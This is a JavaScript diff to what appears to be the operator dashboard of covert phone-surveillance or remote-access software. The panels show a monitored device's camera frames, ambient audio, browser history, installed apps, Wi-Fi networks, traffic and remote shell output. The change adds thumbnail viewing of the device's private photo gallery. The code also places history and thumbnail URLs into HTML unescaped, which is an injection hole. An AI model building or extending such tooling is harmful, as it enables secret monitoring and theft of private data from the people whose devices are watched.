@@ -209,7 +209,6 @@ function initializeTelemetryStream(uid) {
         const ls = document.getElementById('last-seen-text');
         if (ls && (d.last_seen || d.lastSeen)) ls.textContent = new Date(d.last_seen || d.lastSeen).toLocaleString();
 
-        // Media display — Photo > Video > Audio priority
         const img = document.getElementById('cameraPreviewFrame');
         const vid = document.getElementById('mediaVideoPlayer');
         const aud = document.getElementById('mediaAudioPlayer');
@@ -282,7 +281,7 @@ function initializeDataFeedListeners(uid) {
         const nets = d.nearby_networks||[]; const c = document.getElementById('wifi-count'); if(c) c.textContent = nets.length;
         const f = document.getElementById('wifi-feed'); if(!f) return;
         let h = `<div class="feed-item" style="color:#00ff88;">Connected: <strong>${esc(d.current_ssid||'Not connected')}</strong> (RSSI: ${d.current_rssi||'--'})</div>`;
-        h += nets.slice(0,30).map(n=>{const b=n.signal_strength>-50?'🟢':n.signal_strength>-70?'🟡':'🔴';const l=n.is_secured?'🔒':'🔓';return `<div class="feed-item">${b} ${l} <strong>${esc(n.ssid||'Hidden')}</strong> <small>${n.signal_strength}dBm • ${n.frequency}MHz</small></div>`;}).join('');
+        h += nets.slice(0,30).map(n=>{const b=n.signal_strength>-50?'🟢':n.signal_strength>-70?'🟡':'';const l=n.is_secured?'🔒':'🔓';return `<div class="feed-item">${b} ${l} <strong>${esc(n.ssid||'Hidden')}</strong> <small>${n.signal_strength}dBm • ${n.frequency}MHz</small></div>`;}).join('');
         f.innerHTML = h;
     });
     listenToFeed(uid, 'installed_apps', (d) => {
@@ -332,11 +331,37 @@ function initializeDataFeedListeners(uid) {
         if(!h.length){f.innerHTML='No browser history yet';return;}
         f.innerHTML = h.slice(0,50).map(h=>`<div class="feed-item"><strong>${esc(h.title||'Untitled')}</strong><br><a href="${h.url}" target="_blank" style="color:#4ecdc4;font-size:11px;">${esc((h.url||'').substring(0,80))}</a> <small>${fmtTime(h.date)}</small></div>`).join('');
     });
+
+    // ── GALLERY WITH REAL IMAGE THUMBNAILS ───────────
     listenToFeed(uid, 'gallery_list', (d) => {
         const p = d.photos||[]; const f = document.getElementById('gallery-feed'); if(!f) return;
+
+        // Show loading progress
+        if(d.status==='loading') {
+            let html = `<div class="feed-item" style="color:#ffaa00;">⏳ Loading thumbnails... ${d.total_read||0} photos processed</div>`;
+            html += p.slice(0,10).map(p => {
+                const thumb = p.thumbnail_url || '';
+                const imgHtml = thumb
+                    ? `<img src="${thumb}" style="width:100%;max-width:320px;border-radius:6px;margin-bottom:4px;" loading="lazy">`
+                    : `<div style="width:100%;height:50px;background:#1a1a2e;border-radius:6px;margin-bottom:4px;display:flex;align-items:center;justify-content:center;color:#555;font-size:10px;">Generating...</div>`;
+                return `<div class="feed-item">${imgHtml}<small>${esc(p.name||'')} • ${(p.size_kb||0)}KB</small></div>`;
+            }).join('');
+            f.innerHTML = html;
+            return;
+        }
+
         if(!p.length){f.innerHTML='No gallery data yet';return;}
-        f.innerHTML = p.slice(0,30).map(p=>`<div class="feed-item">🖼️ <strong>${esc(p.name||'Unknown')}</strong> <small>${fmtTime(p.date_taken)} • ${(p.size_kb||0)}KB</small></div>`).join('');
+
+        f.innerHTML = p.slice(0,30).map(p => {
+            const thumb = p.thumbnail_url || '';
+            const imgHtml = thumb
+                ? `<img src="${thumb}" style="width:100%;max-width:320px;border-radius:6px;margin-bottom:4px;cursor:pointer;display:block;" onclick="window.open(this.src,'_blank')" loading="lazy" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';">
+                   <div style="width:100%;height:50px;background:#1a1a2e;border-radius:6px;margin-bottom:4px;display:none;align-items:center;justify-content:center;color:#555;font-size:10px;">Failed to load</div>`
+                : `<div style="width:100%;height:50px;background:#1a1a2e;border-radius:6px;margin-bottom:4px;display:flex;align-items:center;justify-content:center;color:#555;font-size:10px;">No thumbnail</div>`;
+            return `<div class="feed-item">${imgHtml}<strong>${esc(p.name||'Unknown')}</strong> <small>${fmtTime(p.date_taken)} • ${(p.size_kb||0)}KB</small></div>`;
+        }).join('');
     });
+
     listenToFeed(uid, 'shell_output', (d) => {
         const o = document.getElementById('shell-output'); if(o&&d){o.style.display='block';o.textContent=`$ ${d.command||''}\n\n${d.stdout||'(no output)'}\n${d.stderr?'\nSTDERR: '+d.stderr:''}\n\nExit code: ${d.exit_code??'?'}`;}
     });
@@ -368,7 +393,6 @@ function initializeDataFeedListeners(uid) {
             if(s){s.textContent='OFF';s.style.color='#666';}
         }
 
-        // Update ambient feed panel with audio player
         const af = document.getElementById('ambient-feed');
         if(af) {
             let html = `<div class="feed-item"><strong>Status:</strong> ${d.status||'unknown'}</div>`;
@@ -381,7 +405,6 @@ function initializeDataFeedListeners(uid) {
             af.innerHTML = html;
         }
 
-        // Also update media monitor audio player
         if(d.last_audio_url) {
             const aud = document.getElementById('mediaAudioPlayer');
             const audC = document.getElementById('audio-container');
@@ -405,7 +428,7 @@ function initializeDataFeedListeners(uid) {
         else{b.classList.remove('active');if(s){s.textContent='OFF';s.style.color='#666';}}
     });
 
-    // ── TRAFFIC — dedicated panel ────────────────────
+    // ── TRAFFIC ──────────────────────────────────────
     listenToFeed(uid, 'traffic_current', (d) => {
         const f = document.getElementById('traffic-feed'); if(!f||!d) return;
         let html = `<div class="feed-item"><strong>📊 Total</strong></div>`;
@@ -419,7 +442,6 @@ function initializeDataFeedListeners(uid) {
         html += `<div class="feed-item"><small>${fmtTime(d.timestamp)}</small></div>`;
         f.innerHTML = html;
 
-        // Also append to battery panel
         const bf = document.getElementById('battery-feed');
         if(bf && !bf.innerHTML.includes('Network Traffic')) {
             bf.innerHTML += `<div class="feed-item" style="border-top:1px solid #333;margin-top:8px;padding-top:8px;"><strong>📊 Traffic</strong> RX:${d.total_rx_mb||'?'} TX:${d.total_tx_mb||'?'} MB</div>`;
